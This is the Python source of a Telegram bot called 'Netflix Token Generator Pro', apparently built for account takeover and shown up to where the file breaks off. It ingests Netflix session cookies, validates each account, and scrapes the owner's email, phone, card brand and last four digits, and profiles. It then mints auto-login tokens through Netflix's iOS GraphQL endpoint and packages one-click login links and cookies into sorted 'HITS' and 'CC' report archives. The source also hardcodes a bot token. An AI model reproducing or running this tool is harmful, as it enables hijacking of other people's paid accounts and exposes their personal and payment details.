#!/usr/bin/env python3
"""
Netflix Token Generator Pro — Clean Fast Build
iOS FTL endpoint only. No loops in logic. No BeautifulSoup.
"""

import asyncio, html as html_mod, io, json, logging, os, re, time, zipfile
from datetime import datetime
from typing import Optional
from urllib.parse import quote
from concurrent.futures import ThreadPoolExecutor

import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, filters
)

# ─── CONFIG ───────────────────────────────────────────────────────────────────
BOT_TOKEN = "7990193328:AAHMFPsPJYnS7P2eQPVgBxarGNxh19cnltQ"
ADMIN_IDS = []

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
for _mod in ("httpx", "telegram", "urllib3", "requests", "charset_normalizer", "httpcore"):
    logging.getLogger(_mod).setLevel(logging.WARNING)
logger = logging.getLogger(__name__)

stats = {"total_checked": 0, "total_valid": 0, "total_invalid": 0, "total_tokens": 0,
         "filter_hits": 0, "start_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}

# ─── CONSTANTS ────────────────────────────────────────────────────────────────

COUNTRY_FLAGS = {
    "US":"🇺🇸","NL":"🇳🇱","GB":"🇬🇧","DE":"🇩🇪","FR":"🇫🇷","CA":"🇨🇦",
    "AU":"🇦🇺","JP":"🇯🇵","BR":"🇧🇷","IN":"🇮🇳","ES":"🇪🇸","IT":"🇮🇹",
    "MX":"🇲🇽","PL":"🇵🇱","SE":"🇸🇪","NO":"🇳🇴","DK":"🇩🇰","FI":"🇫🇮",
    "BE":"🇧🇪","CH":"🇨🇭","AT":"🇦🇹","PT":"🇵🇹","TR":"🇹🇷","KR":"🇰🇷",
    "TW":"🇹🇼","SG":"🇸🇬","HK":"🇭🇰","NZ":"🇳🇿","ZA":"🇿🇦","AR":"🇦🇷",
    "RO":"🇷🇴","HU":"🇭🇺","CZ":"🇨🇿","GR":"🇬🇷","TH":"🇹🇭","PH":"🇵🇭",
    "MY":"🇲🇾","ID":"🇮🇩","IL":"🇮🇱","CO":"🇨🇴","CL":"🇨🇱","PE":"🇵🇪",
}

COUNTRY_NAMES = {
    "US":"United States","NL":"Netherlands","GB":"United Kingdom","DE":"Germany",
    "FR":"France","CA":"Canada","AU":"Australia","JP":"Japan","BR":"Brazil",
    "IN":"India","ES":"Spain","IT":"Italy","MX":"Mexico","PL":"Poland",
    "SE":"Sweden","NO":"Norway","DK":"Denmark","FI":"Finland","BE":"Belgium",
    "CH":"Switzerland","AT":"Austria","PT":"Portugal","TR":"Turkey",
    "KR":"South Korea","TW":"Taiwan","SG":"Singapore","HK":"Hong Kong",
    "PH":"Philippines","MY":"Malaysia","ID":"Indonesia","TH":"Thailand",
    "ZA":"South Africa","AR":"Argentina","CO":"Colombia","CL":"Chile",
    "PE":"Peru","RO":"Romania","HU":"Hungary","CZ":"Czech Republic",
    "GR":"Greece","IL":"Israel","NZ":"New Zealand","VN":"Vietnam",
    "SA":"Saudi Arabia","AE":"United Arab Emirates","EG":"Egypt",
}

COUNTRY_PHONE_PREFIX = {
    "NL":"+31","DE":"+49","FR":"+33","GB":"+44","BE":"+32","IT":"+39",
    "ES":"+34","AT":"+43","CH":"+41","SE":"+46","NO":"+47","DK":"+45",
    "FI":"+358","PL":"+48","PT":"+351","AU":"+61","NZ":"+64","HU":"+36",
    "RO":"+40","CZ":"+420","GR":"+30","TR":"+90","IL":"+972",
    "JP":"+81","KR":"+82","IN":"+91","BR":"+55","US":"+1","CA":"+1",
    "SG":"+65","HK":"+852","TW":"+886","TH":"+66","MY":"+60","ID":"+62",
    "ZA":"+27","MX":"+52","AR":"+54","CO":"+57","CL":"+56","PE":"+51",
    "PH":"+63",
}

GQL_PAYLOAD = {
    "operationName": "CreateAutoLoginToken",
    "variables":     {"scope": "WEBVIEW_MOBILE_STREAMING"},
    "extensions":    {"persistedQuery": {"version": 102,
                      "id": "76e97129-f4b5-41a0-a73c-12e674896849"}},
}

IOS_URL = "https://ios.prod.ftl.netflix.com/graphql"
IOS_UA  = "Netflix/16.8.1 CFNetwork/1410.1 Darwin/22.6.0"
WEB_UA  = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"


# ─── UTILS ────────────────────────────────────────────────────────────────────

def clean_string(s):
    if not s: return s
    s = re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), s)
    s = re.sub(r'\\u([0-9a-fA-F]{4})', lambda m: chr(int(m.group(1), 16)), s)
    try: s = html_mod.unescape(s)
    except: pass
    return s.strip()


def field_value(key, content):
    if not content: return None
    m = re.search(r'"' + re.escape(key) + r'"\s*:\s*\{[^}]*?"fieldType"\s*:\s*"String"[^}]*?"value"\s*:\s*"([^"]*)"', content)
    if m: return clean_string(m.group(1))
    m = re.search(r'"' + re.escape(key) + r'"\s*:\s*"([^"]+)"', content)
    return clean_string(m.group(1)) if m else None


def is_valid_email(s):
    if not s or len(s) > 254 or len(s) < 6: return False
    return bool(re.match(r'^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$', s))


def format_phone(raw, country):
    if not raw: return "Unknown"
    if raw.strip().startswith('+'): return raw.strip()
    digits = re.sub(r'[^\d]', '', raw)
    prefix = COUNTRY_PHONE_PREFIX.get(country, "")
    if prefix and digits.startswith('0'): return prefix + digits[1:]
    return (prefix + digits) if prefix else ('+' + digits)


def _deep_get(obj, *keys, default=None):
    for key in keys:
        if isinstance(obj, dict): obj = obj.get(key)
        elif isinstance(obj, list) and isinstance(key, int): obj = obj[key] if key < len(obj) else None
        else: return default
        if obj is None: return default
    return obj if obj is not None else default


# ─── EXTRACTORS ───────────────────────────────────────────────────────────────

def extract_email(content):
    m = re.search(r'"emailAddress"\s*:\s*"([^"]+)"', content)
    if m and is_valid_email(clean_string(m.group(1))): return clean_string(m.group(1))
    m = re.search(r'\b([a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})\b', content)
    return clean_string(m.group(1)) if m and is_valid_email(m.group(1)) else None


def extract_member_since(content):
    m = re.search(r'"memberSince"\s*:\s*"([^"]+)"', content)
    if m:
        val = clean_string(m.group(1))
        if not re.match(r'^\d{4}-\d{2}-\d{2}', val): return val
        try: return datetime.fromisoformat(val.replace('Z', '+00:00')).strftime("%B %Y")
        except: return val
    m = re.search(r'"memberSince"\s*:\s*\{[^}]*?"value"\s*:\s*(\d+)', content)
    if m:
        try:
            ts = int(m.group(1))
            if ts > 1e12: ts //= 1000
            return datetime.fromtimestamp(ts).strftime("%B %Y")
        except: pass
    return None


def extract_owner_name(content):
    m = re.search(r'"isOwner"\s*:\s*true', content)
    if m:
        chunk = content[max(0, m.start() - 600): m.start()]
        names = re.findall(r'"profileName"\s*:\s*"([^"]+)"', chunk)
        if names: return clean_string(names[-1])
    return None


def extract_profiles(content):
    seen, result = set(), []
    for m in re.finditer(r'"profileName"\s*:\s*"((?:[^"\\]|\\.)*)"\s*', content):
        name = clean_string(m.group(1)).strip()
        if name and name not in seen:
            seen.add(name)
            result.append(name)
    return result


def extract_membership_status(content):
    m = re.search(r'"membershipStatus"\s*:\s*"([^"]+)"', content)
    return clean_string(m.group(1)) if m else "CURRENT_MEMBER"


def extract_card_info(content):
    if not content: return None, None, None
    m = re.search(
        r'"GrowthCardPaymentMethod"[^}]*?"displayText"\s*:\s*"(\d{4})"[^}]*?"paymentOptionLogo"\s*:\s*\{[^}]*?"paymentOptionLogo"\s*:\s*"([^"]+)"',
        content
    )
    if m: return f"{m.group(2).upper()} •••• {m.group(1)}", m.group(2).upper(), m.group(1)
    dm = re.search(r'"displayText"\s*:\s*"(\d{4})"', content)
    if dm:
        last4 = dm.group(1)
        chunk = content[dm.start():dm.start() + 300]
        logo = re.search(r'"paymentOptionLogo"\s*:\s*"([^"]+)"', chunk)
        if logo: return f"{logo.group(1).upper()} •••• {last4}", logo.group(1).upper(), last4
        return f"•••• {last4}", None, last4
    m = re.search(r'(Visa|VISA|Mastercard|MASTERCARD|Amex|AMEX|Discover|JCB)\s*(?:&bull;|•|·|\*|×){4,}\s*(\d{4})', content)
    if m: return f"{m.group(1).upper()} •••• {m.group(2)}", m.group(1).upper(), m.group(2)
    return None, None, None


# ─── COOKIE PARSING ───────────────────────────────────────────────────────────

def parse_cookies_from_text(text):
    if not text or not text.strip(): return None
    text = text.strip()
    cd = {}

    try:
        data = json.loads(text)
        if isinstance(data, list):
            cd = {(i.get("name") or i.get("Name") or ""): (i.get("value") or i.get("Value") or "")
                  for i in data if isinstance(i, dict)}
        elif isinstance(data, dict):
            cd = {k: v for k, v in data.items() if isinstance(v, str)}
        if cd.get("NetflixId"): return cd
    except: pass

    hm = re.match(r'(?i)^cookie\s*:\s*(.+)', text, re.DOTALL)
    if hm:
        cd = {}
        for p in re.split(r';\s*', hm.group(1).strip()):
            if '=' in p:
                k, _, v = p.partition('=')
                if k.strip(): cd[k.strip()] = v.strip()
        if cd.get("NetflixId"): return cd

    if ("netflix.com" in text or "NetflixId" in text) and ("\t" in text or re.search(r'\S+\s{2,}\S+', text)):
        cd = {}
        for line in text.splitlines():
            line = line.strip()
            if not line or line.startswith('#'): continue
            parts = line.split('\t') if '\t' in line else re.split(r'\s{2,}', line)
            if len(parts) >= 7: cd[parts[5]] = parts[6] if len(parts) == 7 else '  '.join(parts[6:])
        if cd.get("NetflixId"): return cd

    if 'NetflixId' in text or 'netflixid' in text.lower():
        cd = {}
        for p in re.split(r'[;\n]', text):
            p = p.strip()
            if '=' in p and not p.startswith('#'):
                k, _, v = p.partition('=')
                k = k.strip()
                if k and ' ' not in k and '\t' not in k: cd[k] = v.strip()
        if cd.get("NetflixId"): return cd

    cd = {}
    for name in ("NetflixId", "SecureNetflixId", "nfvdid", "flwssn", "gsid"):
        m = re.search(name + r'\s*[=\t ]\s*([^\s;&\n"\'<>]+)', text)
        if m: cd[name] = m.group(1).strip()
    return cd if cd.get("NetflixId") else None



# ─── REACTCONTEXT ─────────────────────────────────────────────────────────────

def _extract_rc(content):
    m = re.search(r'netflix\.reactContext\s*=\s*(\{.+?\});\s*', content, re.DOTALL)
    if not m: m = re.search(r'"reactContext"\s*[=:]\s*(\{.+?\})\s*[,;]', content, re.DOTALL)
    if not m: m = re.search(r'reactContext\s*=\s*(\{.+?\});\s*</script>', content, re.DOTALL)
    if m:
        try: return json.loads(m.group(1))
        except: pass
    return {}


# ─── PARALLEL FETCHERS ────────────────────────────────────────────────────────

def _fetch_extra_member(session):
    try:
        r = session.get("https://www.netflix.com/accountowner/addextramember", allow_redirects=False, timeout=10)
        return r.status_code == 200
    except: return False



def _fetch_profiles(session):
    try:
        r = session.get("https://www.netflix.com/SwitchProfile", timeout=15)
        return extract_profiles(r.text)
    except: return []


# ─── CHECK ACCOUNT ────────────────────────────────────────────────────────────

def check_account(cookie_dict):
    session = requests.Session()
    for k, v in cookie_dict.items():
        session.cookies.set(k, v)
    session.headers.update({"Accept-Encoding": "identity", "Accept-Language": "en-US,en;q=0.9", "User-Agent": WEB_UA})

    try:
        resp = session.get("https://www.netflix.com/YourAccount", timeout=25)
        content = resp.text

        if not cookie_dict.get("SecureNetflixId"):
            snfid = session.cookies.get("SecureNetflixId")
            if snfid: cookie_dict["SecureNetflixId"] = snfid
        if not cookie_dict.get("SecureNetflixId"):
            m = re.search(r'SecureNetflixId["\s:=]+([^"\s;&<>]+)', content)
            if m: cookie_dict["SecureNetflixId"] = m.group(1)

        if ("Sign In" in content or "Sign in" in content) and "membershipStatus" not in content and "YourAccount" not in resp.url:
            return None

        with ThreadPoolExecutor(max_workers=2) as pool:
            f1 = pool.submit(_fetch_extra_member, session)
            f2 = pool.submit(_fetch_profiles, session)
            extra_member = f1.result()
            api_profiles = f2.result()

        rc = _extract_rc(content)
        user_data    = _deep_get(rc, "models", "userInfo", "data", default={})
        member_data  = _deep_get(rc, "models", "memberContext", "data", default={})
        acct_data    = _deep_get(rc, "models", "account", "data", default={})
        plan_data    = _deep_get(rc, "models", "plan", "data", default={}) or _deep_get(rc, "models", "subscription", "data", default={}) or {}
        payment_data = _deep_get(rc, "models", "payment", "data", default={}) or _deep_get(rc, "models", "paymentMethod", "data", default={}) or {}
        profile_data = _deep_get(rc, "models", "profiles", "data", default={})

        country = _deep_get(acct_data, "countryOfSignup") or _deep_get(member_data, "countryOfSignup") or _deep_get(user_data, "countryOfSignup") or field_value("countryOfSignup", content) or "Unknown"
        email = _deep_get(acct_data, "emailAddress") or _deep_get(user_data, "emailAddress") or extract_email(content)

        profiles, owner_name = [], None
        if isinstance(profile_data, dict):
            for pid, pobj in profile_data.items():
                if not isinstance(pobj, dict): continue
                name = clean_string(pobj.get("profileName") or pobj.get("name") or "").strip()
                if name and name not in profiles: profiles.append(name)
                if pobj.get("isOwner") or pobj.get("isAccountOwner"): owner_name = name
        if not profiles: profiles = api_profiles
        if not profiles: profiles = extract_profiles(content)
        if not owner_name: owner_name = extract_owner_name(content)

        plan = _deep_get(plan_data, "localizedPlanName") or _deep_get(plan_data, "planName") or _deep_get(acct_data, "localizedPlanName") or field_value("localizedPlanName", content) or field_value("planName", content) or "Unknown"
        price = _deep_get(plan_data, "planPrice") or _deep_get(plan_data, "price") or field_value("planPrice", content)
        member_since = _deep_get(acct_data, "memberSince") or _deep_get(member_data, "memberSince") or extract_member_since(content)
        billing_date = _deep_get(payment_data, "nextBillingDate") or _deep_get(acct_data, "nextBillingDate") or field_value("nextBillingDate", content)
        payment_method = _deep_get(payment_data, "paymentMethod") or field_value("paymentMethod", content)

        card_display, _ctype, _clast = extract_card_info(content)

        raw_phone = _deep_get(acct_data, "phoneNumber") or _deep_get(user_data, "phoneNumber") or field_value("phoneNumber", content)

        def _rc_bool(key, p1, p2):
            v = _deep_get(rc, *p1.split("."))
            if v is not None: return "Yes" if v is True else "No"
            v = _deep_get(rc, *p2.split("."))
            if v is not None: return "Yes" if v is True else "No"
            m = re.search(r'"' + re.escape(key) + r'"\s*:\s*(true|false)', content)
            return ("Yes" if m and m.group(1) == "true" else "No") if m else "No"

        phone_verified = _rc_bool("isPhoneVerified", "models.userInfo.data.isPhoneVerified", "models.account.data.isPhoneVerified")
        email_verified = _rc_bool("isEmailVerified", "models.userInfo.data.isEmailVerified", "models.account.data.isEmailVerified")
        payment_hold = _rc_bool("onPaymentHold", "models.payment.data.onPaymentHold", "models.memberContext.data.onPaymentHold")

        max_streams = _deep_get(plan_data, "maxStreams") or _deep_get(plan_data, "numStreams")
        if not max_streams:
            ms = re.search(r'"maxStreams"\s*:\s*(?:\{[^}]*?"value"\s*:\s*)?(\d+)', content)
            max_streams = ms.group(1) if ms else None

        video_quality = _deep_get(plan_data, "videoQuality") or field_value("videoQuality", content)
        membership_status = _deep_get(member_data, "membershipStatus") or extract_membership_status(content)
        extra_slot = _deep_get(rc, "models", "extraMember", "data", "availableSlots") or _deep_get(rc, "models", "extraMember", "data", "slots")

        phone_category = "verified_number" if raw_phone and phone_verified == "Yes" else ("non_verify" if raw_phone else "non_number")
        vq = (video_quality or "").upper()
        quality_bucket = "UHD" if ("UHD" in vq or "4K" in vq or "HDR" in vq) else ("HD720p" if "HD" in vq and "720" in vq else ("HD" if "HD" in vq else "SD"))

        return {
            "name": owner_name or (profiles[0] if profiles else "Unknown"),
            "email": email, "country": country, "plan": plan, "price": price,
            "member_since": member_since, "billing_date": billing_date,
            "payment_method": payment_method, "card_display": card_display,
            "card_brand": _ctype or (re.match(r'(\w+)', card_display).group(1) if card_display else "Unknown"),
            "card_last4": _clast or "Unknown",
            "phone": format_phone(raw_phone, country) if raw_phone else "Unknown",
            "phone_verified": phone_verified, "phone_category": phone_category,
            "video_quality": video_quality, "quality_bucket": quality_bucket,
            "max_streams": max_streams, "payment_hold": payment_hold,
            "email_verified": email_verified, "membership_status": membership_status,
            "extra_member": "Yes" if extra_member else "No",
            "extra_member_slot": str(extra_slot) if extra_slot else "Unknown",
            "profiles": profiles, "profile_count": len(profiles),
            "is_premium": plan.lower() not in ("unknown", "basic", "") and any(k in plan.lower() for k in ("standard","premium","ultra","4k")),
            "cookie_string": "; ".join(f"{k}={v}" for k, v in cookie_dict.items()),
            "session_cookies": dict(session.cookies.get_dict()),
        }

    except Exception as e:
        logger.error(f"check_account: {e}", exc_info=True)
        return None


# ─── TOKEN — iOS DIRECT CALL ─────────────────────────────────────────────────

def generate_nftoken(cookie_dict, session_cookies=None):
    if session_cookies:
        merged = dict(cookie_dict)
        for k, v in session_cookies.items():
            if v and not merged.get(k): merged[k] = v
        cookie_dict = merged

    nfid = cookie_dict.get("NetflixId", "")
    if not nfid: return None, ["NetflixId"]

    cookie_str = "; ".join(f"{k}={v}" for k, v in cookie_dict.items() if v)

    try:
        resp = requests.post(IOS_URL, headers={
            "User-Agent": IOS_UA,
            "Accept": "multipart/mixed;deferSpec=20220824, application/graphql-response+json, application/json",
            "Content-Type": "application/json",
            "Origin": "https://www.netflix.com",
            "Referer": "https://www.netflix.com/",
            "Cookie": cookie_str,
        }, json=GQL_PAYLOAD, timeout=20)

        if resp.status_code == 200:
            data = resp.json()
            token_obj = (data.get("data") or {}).get("createAutoLoginToken")
            if token_obj:
                token = token_obj if isinstance(token_obj, str) else (token_obj.get("token") or token_obj.get("value") or token_obj.get("nftoken"))
                if token and len(token) > 10:
                    now = datetime.now()
                    exp_ts = time.time() + 59 * 60
                    diff = int(exp_ts - time.time())
                    h, rem = divmod(diff, 3600)
                    mi, s = divmod(rem, 60)
                    enc = quote(token, safe="")
                    return {
                        "token": token, "generated": now.strftime("%Y-%m-%d %H:%M:%S"),
                        "expires": datetime.fromtimestamp(exp_ts).strftime("%Y-%m-%d %H:%M:%S"),
                        "remaining": f"0d {h}h {mi}m {s}s",
                        "phone_url": f"https://netflix.com/unsupported?nftoken={enc}",
                        "pc_url": f"https://www.netflix.com/youraccount?nftoken={enc}",
                        "endpoint": "iOS",
                    }, []
            errors = data.get("errors", [])
            if errors: logger.warning(f"[TOKEN] iOS: {errors[0].get('message','')[:200]}")
        else:
            logger.warning(f"[TOKEN] iOS HTTP {resp.status_code}")
    except requests.exceptions.Timeout:
        logger.warning("[TOKEN] iOS TIMEOUT")
    except Exception as e:
        logger.warning(f"[TOKEN] iOS: {e}")

    return None, []


# ─── FILTER ───────────────────────────────────────────────────────────────────

def categorize_account(acct):
    cats = [f"HITS/{acct.get('country','Unknown')}"]
    if acct.get("payment_hold") == "Yes": cats.append("HOLD")
    if acct.get("extra_member") == "Yes": cats.append("EXTRA_MEMBER")
    cats.append(f"QUALITY/{acct.get('quality_bucket','SD')}")
    card = (acct.get("card_display") or "").upper()
    if any(b in card for b in ("VISA","MASTERCARD","AMEX","DISCOVER")):
        cats.append(f"CC/{acct.get('country','Unknown')}_{acct.get('payment_method','Unknown')}")
    cats.append(f"THIRD_PARTY/{acct.get('phone_category','non_number')}")
    return cats


def _format_entry(acct, ti, source):
    c = acct.get("country","Unknown")
    fl, cn = COUNTRY_FLAGS.get(c,"🌍"), COUNTRY_NAMES.get(c,c)
    ip = acct.get("is_premium",False)
    ps = ", ".join(acct.get("profiles") or []) or "Unknown"
    cs = acct.get("cookie_string","")
    nf = re.search(r'(?:^|;\s*)NetflixId=([^;\s]+)', cs)
    cd = "NetflixId=" + nf.group(1) if nf else cs
    lines = ["","="*50, "🌟 PREMIUM ACCOUNT DETAILS 🌟" if ip else "✨ ACCOUNT DETAILS ✨","",
        f"📁 Source: {source}", f"✅ Status: {'Valid Premium Account' if ip else 'Valid Free Account'}","",
        "👤 Account Details:",
        f"• Name: {acct.get('name','Unknown')}", f"• Email: {acct.get('email','Unknown')}",
        f"• Country: {cn} {fl} ({c})", f"• Plan: {acct.get('plan','Unknown')}",
        f"• Price: {acct.get('price') or 'Unknown'}", f"• Member Since: {acct.get('member_since') or 'Unknown'}",
        f"• Payment: {acct.get('payment_method') or 'Unknown'}", f"• Card: {acct.get('card_display') or 'Unknown'}",
        f"• Phone: {acct.get('phone','Unknown')} ({acct.get('phone_verified','No')})",
        f"• Quality: {acct.get('video_quality') or 'Unknown'}", f"• Streams: {acct.get('max_streams') or 'Unknown'}",
        f"• Profiles: {ps}"]
    if ti:
        lines += [f"🔑 Token:", f"• Generated: {ti['generated']}", f"• Expires: {ti['expires']}",
                  f"• Phone Login: {ti['phone_url']}", f"• PC Login: {ti['pc_url']}"]
    else: lines.append("🔑 Token: Not Available")
    lines += [f"🍪 Cookie: {cd}", "-"*40]
    return "\n".join(lines)


def build_filter_report(results, start_time=None):
    ns = datetime.now().strftime("%Y%m%d_%H%M%S")
    nf = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    el = f"{time.time()-start_time:.2f}" if start_time else "0.00"
    total = len(results)
    prem = sum(1 for a,_ in results if a.get("is_premium"))
    cat_files = {}
    for acct, ti in results:
        entry = _format_entry(acct, ti, acct.get("_source","Text Input"))
        for cat in categorize_account(acct): cat_files.setdefault(cat, []).append(entry)

    sp = ["🎬 NETFLIX CHECKER REPORT","="*50,"",f"✅ Valid: {total}",f"💰 Premium: {prem}",
          f"⏱️ Time: {el}s",f"📅 {nf}","","="*50,"💎 PREMIUM DETAILS:","="*50,""]
    cookies = []
    pn = 0
    for acct, ti in results:
        if not acct.get("is_premium"): continue
        pn += 1
        c = acct.get("country","Unknown")
        cs = acct.get("cookie_string","")
        nfm = re.search(r'(?:^|;\s*)NetflixId=([^;\s]+)', cs)
        cd = "NetflixId="+nfm.group(1) if nfm else cs
        sp += [f"#{pn} {acct.get('name','Unknown')} | {COUNTRY_NAMES.get(c,c)} | {acct.get('plan','Unknown')}",
               f"Email: {acct.get('email','Unknown')}", f"Card: {acct.get('card_display','Unknown')}",
               f"Phone: {acct.get('phone','Unknown')}"]
        if ti: sp.append(f"Login: {ti['phone_url']}")
        sp += [f"Cookie: {cd}","-"*40,""]
        cookies.append(cd)
    sp += ["="*50,"🍪 ALL COOKIES:","="*50,""]+cookies+[""]

    zip_buf = io.BytesIO()
    with zipfile.ZipFile(zip_buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("SUMMARY.txt", "\n".join(sp))
        for cat_path, entries in cat_files.items():
            parts = cat_path.split("/")
            zf.writestr(f"{parts[0]}/{(parts[1] if len(parts)>1 else parts[0])}.txt", "\n".join(entries))
    zip_buf.seek(0)
    return "\n".join(sp), zip_buf.read(), ns, len(cat_files)


# ─── FORMATTING ───────────────────────────────────────────────────────────────

def format_fullinfo(acct, ti, missing, source, mode="fullinfo"):
    c = acct.get("country","Unknown")
    fl, cn = COUNTRY_FLAGS.get(c,"🌍"), COUNTRY_NAMES.get(c,c)
    ip = acct.get("is_premium",False)
    ps = ", ".join(acct.get("profiles") or []) or "Unknown"
    lines = ["🌟 PREMIUM ACCOUNT DETAILS 🌟" if ip else "✨ ACCOUNT DETAILS ✨",
        f"✅ Status: {'Valid Premium Account' if ip else 'Valid Free Account'}","","👤 Account Details:",
        f"• Name: {acct.get('name','Unknown')}", f"• Email: {acct.get('email','Unknown')}",
        f"• Country: {cn} {fl} ({c})", f"• Plan: {acct.get('plan','Unknown')}",
        f"• Price: {acct.get('price') or 'Unknown'}", f"• Member Since: {acct.get('member_since') or 'Unknown'}",
        f"• Next Billing: {acct.get('billing_date') or 'Unknown'}", f"• Payment: {acct.get('payment_method') or 'Unknown'}",
        f"• Card: {acct.get('card_display') or 'Unknown'}",
        f"• Phone: {acct.get('phone','Unknown')} ({acct.get('phone_verified','No')})",
        f"• Quality: {acct.get('video_quality') or 'Unknown'}", f"• Streams: {acct.get('max_streams') or 'Unknown'}",
        f"• Hold Status: {acct.get('payment_hold') or 'No'}", f"• Extra Member: {acct.get('extra_member') or 'No'}",
        f"• Extra Member Slot: {acct.get('extra_member_slot') or 'Unknown'}",
        f"• Email Verified: {acct.get('email_verified') or 'No'}",
        f"• Membership Status: {acct.get('membership_status') or 'CURRENT_MEMBER'}",
        f"• Connected Profiles: {acct.get('profile_count',0)}", f"• Profiles: {ps}"]
    if ti:
        lines += ["","🔑 Token Information:", f"• Generated: {ti['generated']}", f"• Expires: {ti['expires']}",
            f"• Remaining: {ti['remaining']}",
            f"• Phone Login: <a href=\"{ti['phone_url']}\">Click to Login</a>",
            f"• PC Login: <a href=\"{ti['pc_url']}\">Click to Login</a>"]
    elif missing: lines += ["", f"🔑 Token: Not Available (missing: {', '.join(missing)})"]
    else: lines += ["", "🔑 Token: Not Available"]
    cs = acct.get("cookie_string","")
    nf = re.search(r"(?:^|;\s*)NetflixId=([^;\s]+)", cs)
    cd = ("NetflixId="+nf.group(1)) if nf else cs
    if len(cd) > 300: cd = cd[:297]+"..."
    lines += ["", f"🍪 Cookie: {cd}", "", f"📊 Source: {source}", f"🎯 Mode: {'Full Information' if mode=='fullinfo' else 'Filter Mode'}"]
    return "\n".join(lines)


def format_tokenonly(acct, ti, missing, source):
    c = acct.get("country","Unknown")
    fl = COUNTRY_FLAGS.get(c,"🌍")
    if not ti:
        r = f"missing: {', '.join(missing)}" if missing else "API error"
        return f"❌ Token Not Generated\n\n• Email: {acct.get('email','Unknown')}\n• Country: {c} {fl}\n• Plan: {acct.get('plan','Unknown')}\n\n⚠️ {r}"
    return (f"✅ Token Generated!\n\n• Email: {acct.get('email','Unknown')}\n• Country: {c} {fl}\n"
            f"• Plan: {acct.get('plan','Unknown')}\n\n🔑 Token Information:\n• Generated: {ti['generated']}\n"
            f"• Expires: {ti['expires']}\n• Remaining: {ti['remaining']}\n\n"
            f"📱 Phone Login: <a href=\"{ti['phone_url']}\">Click to Login</a>\n"
            f"🖥️ PC Login: <a href=\"{ti['pc_url']}\">Click to Login</a>\n\n📊 Source: {source}")


# ─── PROCESS ──────────────────────────────────────────────────────────────────

async def process_cookie_text(text, mode, source, update, context, filter_batch=None):
    global stats
    cd = parse_cookies_from_text(text)
    if not cd or not cd.get("NetflixId"):
        if filter_batch is None:
            await update.message.reply_text("❌ No valid cookies. Input must contain <code>NetflixId=</code>", parse_mode="HTML")
        return

    sm = await update.message.reply_text(
        "🍪 <b>Cookie Detected</b>\n\n"
        "<b>Status:</b> Checking account validity...\n"
        "<b>Type:</b> Single cookie from text\n"
        f"<b>Mode:</b> {'Fullinfo' if mode == 'fullinfo' else 'Token Only' if mode == 'tokenonly' else 'Filter'}\n\n"
        "⚠️ Use /cancel to stop this task",
        parse_mode="HTML"
    )

    stats["total_checked"] += 1
    loop = asyncio.get_event_loop()
    acct = await loop.run_in_executor(None, check_account, cd)

    if not acct:
        stats["total_invalid"] += 1
        await sm.edit_text("❌ <b>Invalid or Expired Cookie</b>", parse_mode="HTML")
        return

    stats["total_valid"] += 1
    plan  = acct.get("plan", "Unknown")
    price = acct.get("price") or "Unknown"
    name  = acct.get("name") or "Unknown"
    ip    = acct.get("is_premium", False)

    vl = "✅ <b>Premium Account Verified</b>" if ip else "✅ <b>Account Verified</b>"
    sl = "Valid Premium Account" if ip else "Valid Account"
    await sm.edit_text(
        f"{vl}\n\n"
        f"<b>Status:</b> {sl}\n"
        f"<b>Name:</b> {name}\n"
        f"<b>Plan:</b> {plan}\n"
        f"<b>Price:</b> {price}\n\n"
        "Generating token...",
        parse_mode="HTML"
    )

    sc = acct.get("session_cookies", {})
    ti, missing = await loop.run_in_executor(None, lambda: generate_nftoken(cd, sc))
    if ti: stats["total_tokens"] += 1

    await sm.edit_text(
        f"{vl}\n\n"
        f"<b>Status:</b> {sl}\n"
        f"<b>Name:</b> {name}\n"
        f"<b>Plan:</b> {plan}\n"
        f"<b>Price:</b> {price}\n\n"
        f"<b>Token:</b> {'✅ Generated' if ti else '❌ Not Available'}",
        parse_mode="HTML"
    )

    if filter_batch is not None:
        acct["_source"] = source; filter_batch.append((acct, ti)); stats["filter_hits"] += 1; return

    msg = format_tokenonly(acct, ti, missing, source) if mode == "tokenonly" else format_fullinfo(acct, ti, missing, source, mode)
    if len(msg) > 4000: await update.message.reply_text(msg[:3900]+"\n...", parse_mode="HTML", disable_web_page_preview=True)
    else: await update.message.reply_text(msg, parse_mode="HTML", disable_web_page_preview=True)


# ─── COMMANDS ─────────────────────────────────────────────────────────────────

async def start(update, context):
    context.user_data["mode"] = "fullinfo"
    kb = [[InlineKeyboardButton("📤 File", callback_data="action_file"), InlineKeyboardButton("✏️ Text", callback_data="action_text")],
          [InlineKeyboardButton("🎯 Filter", callback_data="action_filter"), InlineKeyboardButton("📊 Stats", callback_data="action_stats")],
          [InlineKeyboardButton("⚙️ Settings", callback_data="action_settings")]]
    await update.message.reply_text("🎬 *Netflix Token Generator Pro* 🚀\n\n/tokenonly \\- Token only\n/fullinfo \\- Full details\n/filter \\- Categorize\n/stats \\- Statistics\n\nSend cookies to start\\!",
        parse_mode="MarkdownV2", reply_markup=InlineKeyboardMarkup(kb))

async def tokenonly_cmd(u, c): c.user_data["mode"]="tokenonly"; await u.message.reply_text("✅ *Token Only Mode*\\. Send cookies\\.", parse_mode="MarkdownV2")
async def fullinfo_cmd(u, c): c.user_data["mode"]="fullinfo"; await u.message.reply_text("✅ *Full Info Mode*\\. Send cookies\\.", parse_mode="MarkdownV2")
async def filter_cmd(u, c): c.user_data["mode"]="filter"; await u.message.reply_text("🎯 *Filter Mode*\\. Send ZIP/TXT\\.", parse_mode="MarkdownV2")
async def cancel_cmd(u, c): await u.message.reply_text("❌ No active task\\.", parse_mode="MarkdownV2")

async def stats_cmd(u, c):
    if ADMIN_IDS and u.effective_user.id not in ADMIN_IDS: await u.message.reply_text("❌ Admin only."); return
